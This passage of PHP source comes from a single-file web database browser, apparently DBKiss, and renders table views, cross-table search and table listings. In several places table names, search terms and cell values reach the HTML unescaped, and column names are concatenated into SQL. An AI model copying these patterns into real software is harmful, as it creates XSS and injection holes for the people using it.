		if ($count && $rs) {
			$rows = array();
			while ($row = db_row($rs)) {
				$rows[] = $row;
			}
			db_free($rs);
			if (count($rows) && !array_col_match_unique($rows, $pk, '#^\d+$#')) {
				$pk = guess_pk($rows);
			}
		}

		function indenthead($str)
		{
			if (is_array($str)) {
				$str2 = '';
				foreach ($str as $k => $v) {
					$str2 .= sprintf('%s: %s'."\r\n", $k, $v);
				}
				$str = $str2;
			}
			$lines = explode("\n", $str);
			$max_len = 0;
			foreach ($lines as $k => $line) {
				$lines[$k] = trim($line);
				if (preg_match('#^[^:]+:#', $line, $match)) {
					if ($max_len < strlen($match[0])) {
						$max_len = strlen($match[0]);
					}
				}
			}
			foreach ($lines as $k => $line) {
				if (preg_match('#^[^:]+:#', $line, $match)) {
					$lines[$k] = str_replace($match[0], $match[0].str_repeat('&nbsp;', $max_len - strlen($match[0])), $line);
				}
			}
			return implode("\r\n", $lines);
		}

		if (get('indenthead')) {
			echo '<pre>';
			echo 'Table: '.get('viewtable')."\r\n";
			echo str_repeat('-', 80)."\r\n";
			foreach ($rows as $row) {
				echo indenthead($row);
				echo str_repeat('-', 80)."\r\n";
			}
			echo '</pre>';
			exit;
		}
	?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=<?php echo $page_charset;?>">
	<title><?php echo $db_name_h1?$db_name_h1:$db_name;?> &gt; Table: <?php echo $table;?></title>
	<link rel="shortcut icon" href="<?php echo $_SERVER['PHP_SELF']; ?>?dbkiss_favicon=1">
</head>
<body>

	<?php layout(); ?>

	<h1><a class=blue style="<?php echo $db_name_style;?>" href="<?php echo $_SERVER['PHP_SELF'];?>"><?php echo $db_name_h1?$db_name_h1:$db_name;?></a> &gt; Table: <?php echo $table;?></h1>

	<?php conn_info(); ?>

	<p>
		<a class=blue href="<?php echo $_SERVER['PHP_SELF'];?>">All tables</a>
		&nbsp;&gt;&nbsp;
		<a href="<?php echo $_SERVER['PHP_SELF'];?>?viewtable=<?php echo $table;?>"><b><?php echo $table;?></b></a> (<?php echo $count;?>)
		&nbsp;&nbsp;/&nbsp;&nbsp;
		
		Export to CSV:&nbsp;
		
		<a href="<?php echo $_SERVER['PHP_SELF']; ?>?export=csv&separator=<?php echo urlencode('|');?>&query=<?php echo base64_encode($base_query); ?>">pipe</a>
		-
		<a href="<?php echo $_SERVER['PHP_SELF']; ?>?export=csv&separator=<?php echo urlencode("\t");?>&query=<?php echo base64_encode($base_query); ?>">tab</a>
		-
		<a href="<?php echo $_SERVER['PHP_SELF']; ?>?export=csv&separator=<?php echo urlencode(',');?>&query=<?php echo base64_encode($base_query); ?>">comma</a>
		-
		<a href="<?php echo $_SERVER['PHP_SELF']; ?>?export=csv&separator=<?php echo urlencode(';');?>&query=<?php echo base64_encode($base_query); ?>">semicolon</a>

		&nbsp;&nbsp;/&nbsp;&nbsp;
		Functions:
		<a href="<?php echo $_SERVER['PHP_SELF'];?>?viewtable=<?php echo $table;?>&indenthead=1">indenthead()</a>
	</p>

	<form action="<?php echo $_SERVER['PHP_SELF'];?>" method="get" style="margin-bottom: 1em;">
	<input type="hidden" name="viewtable" value="<?php echo $table;?>">
	<table class="ls" cellspacing="1">
	<tr>
		<td><input type="text" name="search" value="<?php echo html_once(get('search'));?>"></td>
		<td><select name="column"><option value=""></option><?php echo options($columns2, get('column'));?></select></td>
		<td><select name="column_type"><option value=""></option><?php echo options($types_group, get('column_type'));?></select></td>
		<td><input type="submit" value="Search"></td>
		<td>
			order by:
			<select name="order_by"><option value=""></option><?php echo options($columns, get('order_by'));?></select>
			<input type="checkbox" name="order_desc" id="order_desc" value="1" <?php echo checked(get('order_desc'));?>>
			<label for="order_desc">desc</label>
		</td>
		<td>
			<input type="checkbox" name="full_content" id="full_content" <?php echo checked(get('full_content'));?>>
			<label for="full_content">full content</label>
		</td>
		<td>
			<input type="checkbox" name="nl2br" id="nl2br" <?php echo checked(get('nl2br'));?>>
			<label for="nl2br">nl2br</label>
		</td>
	</tr>
	</table>
	</form>

	<?php if ($count): ?>

		<?php if ($count && $count != $found): ?>
			<p>Found: <b><?php echo $found;?></b></p>
		<?php endif; ?>

		<?php if ($found): ?>

			<?php if ($pages > 1): ?>
			<p>
				<?php if ($page > 1): ?>
					<a href="<?php echo url_offset(($page-1)*$limit-$limit);?>">&lt;&lt; Prev</a> &nbsp;
				<?php endif; ?>
				Page <b><?php echo $page;?></b> of <b><?php echo $pages;?></b> &nbsp;
				<?php if ($pages > $page): ?>
					<a href="<?php echo url_offset($page*$limit);?>">Next &gt;&gt;</a>
				<?php endif; ?>
			</p>
			<?php endif; ?>

			<script>
			function mark_row(tr)
			{
				var els = tr.getElementsByTagName('td');
				if (tr.marked) {
					for (var i = 0; i < els.length; i++) {
						els[i].style.backgroundColor = '';
					}
					tr.marked = false;
				} else {
					tr.marked = true;
					for (var i = 0; i < els.length; i++) {
						els[i].style.backgroundColor = '#ddd';
					}
				}
			}
			</script>

			<table class="ls" cellspacing="1">
			<tr>
				<?php if ($pk): ?><th>#</th><?php endif; ?>
				<?php foreach ($columns as $col): ?>
					<?php
						$params = array('order_by'=>$col);
						$params['order_desc'] = 0;
						if (get('order_by') == $col) {
							$params['order_desc'] = get('order_desc') ? 0 : 1;
						}
					?>
					<th><a style="color: #000;" href="<?php echo url(self(), $params);?>"><?php echo $col;?></a></th>
				<?php endforeach; ?>
			</tr>
			<?php
				$get_full_content = get('full_content');
				$get_nl2br = get('nl2br');
				$get_search = get('search');
			?>
			<?php
				$edit_url_tpl = url(self(true), array('action'=>'editrow', 'table'=>$table, 'pk'=>$pk, 'id'=>'%s'));
			?>
			<?php foreach ($rows as $row): ?>
			<tr ondblclick="mark_row(this)">
				<?php if ($pk): ?>
					<?php $edit_url = sprintf($edit_url_tpl, $row[$pk]); ?>
					<td><a href="javascript:void(0)" onclick="popup('<?php echo $edit_url;?>', 620, 500)">Edit</a>&nbsp;</td>
				<?php endif; ?>
				<?php foreach ($row as $k => $v): ?>
					<?php
						$v = strip_tags($v);
						$v = create_links($v);
						if (!$get_full_content) {
							$v = truncate_html($v, 50);
						}
						//$v = html_once($v);
						//$v = htmlspecialchars($v); -- create_links() disabling
						$nl2br = $get_nl2br;
						if ($get_full_content) {
							$v = str_wrap($v, 80, '<br>', true);
						}
						if ($get_nl2br) {
							$v = nl2br($v);
						}
						//$v = stripslashes(stripslashes($v));
						if ($get_search) {
							$search = $_GET['search'];
							$search_quote = preg_quote($search);
							$v = preg_replace('#('.$search_quote.')#i', '<span style="background: yellow;">$1</span>', $v);
						}
						if ($types[$k] == 'int' && (preg_match('#time#i', $k) || preg_match('#date#i', $k))
							&& preg_match('#^\d+$#', $v))
						{
							$tmp = @date('Y-m-d H:i', $v);
							if ($tmp) {
								$v = $tmp;
							}
						}
					?>
					<td onclick="mark_col(this)" <?php echo $nl2br?'valign="top"':'';?> nowrap><?php echo is_null($row[$k])?'-':$v;?></td>
				<?php endforeach; ?>
			</tr>
			<?php endforeach; ?>
			</table>

			<?php if ($pages > 1): ?>
			<p>
				<?php if ($page > 1): ?>
					<a href="<?php echo url_offset(($page-1)*$limit-$limit);?>">&lt;&lt; Prev</a> &nbsp;
				<?php endif; ?>
				Page <b><?php echo $page;?></b> of <b><?php echo $pages;?></b> &nbsp;
				<?php if ($pages > $page): ?>
					<a href="<?php echo url_offset($page*$limit);?>">Next &gt;&gt;</a>
				<?php endif; ?>
			</p>
			<?php endif; ?>

		<?php endif; ?>

	<?php endif; ?>

<?php powered_by(); ?>
</body>
</html>
<?php exit; endif; ?>
<?php if (get('searchdb')): ?>
<?php

	// ----------------------------------------------------------------
	// SEARCH DB
	// ----------------------------------------------------------------

	$get = get(array(
		'types' => 'array',
		'search' => 'string',
		'md5' => 'bool',
		'table_filter' => 'string'
	));
	$get['search'] = trim($get['search']);

	$tables = list_tables();

	if ($get['table_filter']) {
		foreach ($tables as $k => $table) {
			if (!str_has_any($table, $get['table_filter'], $ignore_case = true)) {
				unset($tables[$k]);
			}
		}
	}

	$all_types = array();
	$columns  = array();
	foreach ($tables as $table) {
		$types = table_types2($table);
		$columns[$table] = $types;
		$types = array_values($types);
		$all_types = array_merge($all_types, $types);
	}
	$all_types = array_unique($all_types);

	if ($get['search'] && $get['md5']) {
		$get['search'] = md5($get['search']);
	}

?>
<?php layout_start(sprintf('%s &gt; Search', $db_name)); ?>
	<h1><a class=blue style="<?php echo $db_name_style;?>" href="<?php echo $_SERVER['PHP_SELF'];?>"><?php echo $db_name_h1?$db_name_h1:$db_name;?></a> &gt; Search</h1>
	<?php conn_info(); ?>

	<form action="<?php echo $_SERVER['PHP_SELF'];?>" method="get">
	<input type="hidden" name="searchdb" value="1">
	<table class="ls" cellspacing="1">
	<tr>
		<th>Search:</th>
		<td>
			<input type="text" name="search" value="<?php echo html_once($get['search']);?>" size="40">
			<?php if ($get['search'] && $get['md5']): ?>
				md5(<?php echo html_once(get('search'));?>)
			<?php endif; ?>
			<input type="checkbox" name="md5" id="md5_label" value="1">
			<label for="md5_label">md5</label>
		</td>
	</tr>
	<tr>
		<th>Table filter:</th>
		<td><input type="text" name="table_filter" value="<?php echo html_once($get['table_filter']);?>">
	</tr>
	<tr>
		<th>Columns:</th>
		<td>
			<?php foreach ($all_types as $type): ?>
				<input type="checkbox" id="type_<?php echo $type;?>" name="types[<?php echo $type;?>]" value="1" <?php echo checked(isset($get['types'][$type]));?>>
				<label for="type_<?php echo $type;?>"><?php echo $type;?></label>
			<?php endforeach; ?>
		</td>
	</tr>
	<tr>
		<td colspan="2" class="none">
			<input type="submit" value="Search">
		</td>
	</tr>
	</table>
	</form>

	<?php if ($get['search'] && !count($get['types'])): ?>
		<p>No columns selected.</p>
	<?php endif; ?>

	<?php if ($get['search'] && count($get['types'])): ?>

		<p>Searching <b><?php echo count($tables);?></b> tables for: <b><?php echo html_once($get['search']);?></b></p>

		<?php $found_any = false; ?>

		<?php set_time_limit(0); ?>

		<?php foreach ($tables as $table): ?>
			<?php

				$where = '';
				$cols2 = array();

				$where = '';
				$search = db_escape($get['search']);

				foreach ($columns[$table] as $col => $type)
				{
					if (!in_array($type, array_keys($get['types']))) {
						continue;
					}
					if ($where) {
						$where .= ' OR ';
					}
					if (is_numeric($search)) {
						$where .= "$col = '$search'";
					} else {
						if ('mysql' == $db_driver) {
							$where .= "$col LIKE '%$search%'";
						} else if ('pgsql' == $db_driver) {
							$where .= "$col ILIKE '%$search%'";
						} else {
							trigger_error('db_driver not implemented');
						}
					}
				}

				$found = false;

				if ($where) {
					$where = 'WHERE '.$where;
					$table_enq = quote_table($table);
					$found = db_one("SELECT COUNT(*) FROM $table_enq $where");
				}

				if ($found) {
					$found_any = true;
				}

			?>

			<?php
				if ($where && $found) {
					$limit = 10;
					$offset = 0;
					$pk = table_pk($table);

					$order = "ORDER BY $pk";
					$table_enq = quote_table($table);
					$rs = db_query(db_limit("SELECT * FROM $table_enq $where $order", $offset, $limit));

					$rows = array();
					while ($row = db_row($rs)) {
						$rows[] = $row;
					}
					db_free($rs);
					if (count($rows) && !array_col_match_unique($rows, $pk, '#^\d+$#')) {
						$pk = guess_pk($rows);
					}
				}
			?>

			<?php if ($where && $found): ?>

				<p>
					Table: <a href="<?php echo $_SERVER['PHP_SELF'];?>?viewtable=<?php echo $table;?>&search=<?php echo urlencode($get['search']);?>"><b><?php echo $table;?></b></a><br>
					Found: <b><?php echo $found;?></b>
					<?php if ($found > $limit): ?>
						&nbsp;<a href="<?php echo $_SERVER['PHP_SELF'];?>?viewtable=<?php echo $table;?>&search=<?php echo urlencode($get['search']);?>">show all &gt;&gt;</a>
					<?php endif; ?>
				</p>

				<table class="ls" cellspacing="1">
				<tr>
					<?php if ($pk): ?><th>#</th><?php endif; ?>
					<?php foreach ($columns[$table] as $col => $type): ?>
						<th><?php echo $col;?></th>
					<?php endforeach; ?>
				</tr>
				<?php foreach ($rows as $row): ?>
				<tr>
					<?php if ($pk): ?>
						<?php $edit_url = url(self(true), array('action'=>'editrow', 'table'=>$table, 'pk'=>$pk, 'id'=>$row[$pk])); ?>
						<td><a href="javascript:void(0)" onclick="popup('<?php echo $edit_url;?>', 620, 500)">Edit</a>&nbsp;</td>
					<?php endif; ?>
					<?php foreach ($row as $k => $v): ?>
						<?php
							$v = str_truncate($v, 50);
							$v = html_once($v);
							//$v = stripslashes(stripslashes($v));
							$search = $get['search'];
							$search_quote = preg_quote($search);
							if ($columns[$table][$k] == 'int' && (preg_match('#time#i', $k) || preg_match('#date#i', $k)) && preg_match('#^\d+$#', $v)) {
								$tmp = @date('Y-m-d H:i', $v);
								if ($tmp) {
									$v = $tmp;
								}
							}
							$v = preg_replace('#('.$search_quote.')#i', '<span style="background: yellow;">$1</span>', $v);
						?>
						<td nowrap><?php echo $v;?></td>
					<?php endforeach; ?>
				</tr>
				<?php endforeach; ?>
				</table>

			<?php endif; ?>

		<?php endforeach; ?>

		<?php if (!$found_any): ?>
			<p>No rows found.</p>
		<?php endif; ?>

	<?php endif; ?>

	<?php layout_end(); ?>
<?php exit; endif; ?>

<?php

// ----------------------------------------------------------------
// LIST TABLES
// ----------------------------------------------------------------

$get = get(array('table_filter'=>'string'));

?>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=<?php echo $page_charset;?>">
	<title><?php echo $db_name_h1?$db_name_h1:$db_name;?></title>
	<link rel="shortcut icon" href="<?php echo $_SERVER['PHP_SELF']; ?>?dbkiss_favicon=1">
</head>
<body>

<?php layout(); ?>
<h1  style="<?php echo $db_name_style;?>"><?php echo $db_name_h1?$db_name_h1:$db_name;?></h1>

<?php conn_info(); ?>

<?php $tables = list_tables(); ?>
<?php $status = table_status(); ?>
<?php $views = list_tables(true); ?>

<p>
	Tables: <b><?php echo count($tables);?></b>
	&nbsp;-&nbsp;
	Total size: <b><?php echo number_format(ceil($status['total_size']/1024),0,'',',').' KB';?></b>
	&nbsp;-&nbsp;
	Views: <b><?php echo count($views);?></b>
	&nbsp;-&nbsp;
	
	<a class=blue href="<?php echo $_SERVER['PHP_SELF'];?>?searchdb=1&table_filter=<?php echo html_once($get['table_filter']);?>">Search</a>
	&nbsp;-&nbsp;
	<a class=blue href="<?php echo $_SERVER['PHP_SELF'];?>?import=1">Import</a>
	&nbsp;-&nbsp;
	Export all:
	
	<?php if ('pgsql' == $db_driver): ?>
		&nbsp;<a class=blue href="<?php echo $_SERVER['PHP_SELF'];?>?dump_all=2&table_filter=<?php echo urlencode(html_once($get['table_filter']));?>">Data only</a>
	<?php else: ?>
		&nbsp;<a class=blue href="<?php echo $_SERVER['PHP_SELF'];?>?dump_all=1&table_filter=<?php echo urlencode(html_once($get['table_filter']));?>">Structure</a> ,
		<a class=blue href="<?php echo $_SERVER['PHP_SELF'];?>?dump_all=2&table_filter=<?php echo urlencode(html_once($get['table_filter']));?>">Data & structure</a>
	<?php endif; ?>
</p>

<form action="<?php echo $_SERVER['PHP_SELF'];?>" method="get" name=table_filter_form style="margin-bottom: 0.5em;">
<table cellspacing="0" cellpadding="0"><tr>
<td style="padding-right: 3px;">Table or View:</td>
<td style="padding-right: 3px;"><input type="text" name="table_filter" id=table_filter value="<?php echo html_once($get['table_filter']);?>"></td>
<td style="padding-right: 3px;"><input type="submit" class="button" wait="1" value="Filter"> <a href="javascript:void(0)" onclick="alert('You just start typing on the page and the Input will be focused automatically. ALT+R will Reset the Input and submit the form.')">[?]</a></td>
</tr></table>
</form>

<script>
function table_filter_keydown(e)
{
	if (!e) { e = window.event; }
	if (e.keyCode == 27 || e.keyCode == 33 || e.keyCode == 34 || e.keyCode == 38 || e.keyCode == 40) {
		document.getElementById('table_filter').blur();
		return;
	}
	// alt + r - reset filter input
	if (e.keyCode == 82 && e.altKey) {
		document.getElementById('table_filter').value = "";
		document.forms["table_filter_form"].submit();
		return;
	}
	// 0-9
	if (e.keyCode >= 48 && e.keyCode <= 57 && !e.altKey && !e.ctrlKey && !e.shiftKey && !e.metaKey) {
		document.getElementById('table_filter').focus();
	}
	// a-z
	if (e.keyCode >= 65 && e.keyCode <= 90 && !e.altKey && !e.ctrlKey && !e.shiftKey && !e.metaKey) {
		document.getElementById('table_filter').focus();
	}
}
document.onkeydown = table_filter_keydown;
</script>

<div style="float: left;">

	<?php
		$tables = table_filter($tables, $get['table_filter']);
	?>

	<?php if ($get['table_filter']): ?>
		<p>Tables found: <b><?php echo count($tables);?></b></p>
	<?php endif; ?>

	<table class="ls" cellspacing="1">
	<tr>
		<th>Table</th>
		<th>Count</th>
		<th>Size</th>
		<th>Options</th>
	</tr>
	<?php foreach ($tables as $table): ?>
	<tr>
		<td><a class=blue href="<?php echo $_SERVER['PHP_SELF'];?>?viewtable=<?php echo $table;?>"><?php echo $table;?></a></td>
		<?php
			if ('mysql' == $db_driver) {
				// $table_enq = quote_table($table);
				// $count = db_one("SELECT COUNT(*) FROM $table_enq");
				$count = $status[$table]['count'];
			}
			if ('pgsql' == $db_driver) {
				$count = $status[$table]['count'];
				if (!$count) {
					$table_enq = quote_table($table);
					$count = db_one("SELECT COUNT(*) FROM $table_enq");
				}
			}
		?>
		<td align="right"><?php echo number_format($count,0,'',',');?></td>
		<td align="right"><?php echo number_format(ceil($status[$table]['size']/1024),0,'',',').' KB';?></td>
		<td>
			<a href="<?php echo $_SERVER['PHP_SELF'];?>?dump_table=<?php echo $table;?>">Export</a>
			&nbsp;-&nbsp;
			<?php $table_enq = quote_table($table); ?>
			<form action="<?php echo $_SERVER['PHP_SELF'];?>" name="drop_<?php echo $table;?>" method="post" style="display: inline;"><input type="hidden" name="drop_table" value="<?php echo $table;?>"></form>
			<a href="javascript:void(0)" onclick="if (confirm('DROP TABLE <?php echo $table_enq;?> ?')) document.forms['drop_<?php echo $table;?>'].submit();">Drop</a>
		</td>
	</tr>
	<?php endforeach; ?>
	</table>
	<?php unset($table); ?>

</div>

<?php if (views_supported() && count($views)): ?>
<div style="float: left; margin-left: 2em;">

	<?php
		$views = table_filter($views, $get['table_filter']);
	?>

	<?php if ($get['table_filter']): ?>
		<p>Views found: <b><?php echo count($views);?></b></p>
	<?php endif; ?>

	<table class="ls" cellspacing="1">
	<tr>
		<th>View</th>
		<th><a class=blue href="<?php echo $_SERVER['PHP_SELF']; ?>?table_filter=<?php echo urlencode($get['table_filter']);?>&views_count=<?php echo (isset($_GET['views_count']) && $_GET['views_count']) ? 0 : 1; ?>" style="color: #000; text-decoration: underline;" title="Click to enable/disable counting in Views">Count</a></th>
		<th>Options</th>
	</tr>
	<?php foreach ($views as $view): ?>
	<?php $view_enq = quote_table($view); ?>
	<tr>
		<td><a class=blue href="<?php echo $_SERVER['PHP_SELF'];?>?viewtable=<?php echo $view;?>"><?php echo $view;?></a></td>
		<?php
			if (isset($_GET['views_count']) && $_GET['views_count']) {
				$count = db_one("SELECT COUNT(*) FROM $view_enq");
			} else {
				$count = null;
			}			 
		?>
		<td align=right><?php echo isset($count) ? $count : '-'; ?></td>
		<td>
			<a href="<?php echo $_SERVER['PHP_SELF'];?>?dump_table=<?php echo $view;?>">Export</a>
			&nbsp;-&nbsp;
			<form action="<?php echo $_SERVER['PHP_SELF'];?>" name="drop_<?php echo $view;?>" method="post" style="display: inline;">
			<input type="hidden" name="drop_view" value="<?php echo $view;?>"></form>
			<a href="javascript:void(0)" onclick="if (confirm('DROP VIEW <?php echo $view_enq;?> ?')) document.forms['drop_<?php echo $view;?>'].submit();">Drop</a>
		</td>
	</tr>
	<?php endforeach; ?>
	</table>

</div>
<?php endif; ?>

<div style="clear: both;"></div>


<?php powered_by(); ?>

</body>
</html>

